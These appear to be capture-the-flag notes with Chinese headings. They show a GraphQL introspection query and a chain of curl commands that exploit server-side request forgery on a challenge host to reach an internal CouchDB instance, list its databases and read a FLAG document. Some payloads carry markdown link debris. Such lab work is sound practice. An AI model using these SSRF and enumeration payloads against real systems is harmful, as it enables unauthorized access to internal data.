GraphQL 查询所有字段

{
"query": "query IntrospectionQuery { __schema { types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"
}

SSRF利用

#確認是 couchdb
curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/#\\",\\"sector\\":\\"whale_get_4369\\"}"](http://127.0.0.1:5984/#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_4369%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'

# 取得所有 dbs

curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/_all_dbs#\\",\\"sector\\":\\"whale_get_5984_all_dbs\\"}"](http://127.0.0.1:5984/_all_dbs#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_all_dbs%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'

# 確認 citismart 可請求，取得 docs 並讀取 flag

curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/citismart#\\",\\"sector\\":\\"whale_get_5984_citismart\\"}"](http://127.0.0.1:5984/citismart#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_citismart%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'
curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/citismart/_all_docs#\\",\\"sector\\":\\"whale_get_5984_citismart_all_docs\\"}"](http://127.0.0.1:5984/citismart/_all_docs#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_citismart_all_docs%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'
curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/citismart/FLAG#\\",\\"sector\\":\\"whale_get_5984_citismart_FLAG\\"}"](http://127.0.0.1:5984/citismart/FLAG#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_citismart_FLAG%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale' | grep FLAG
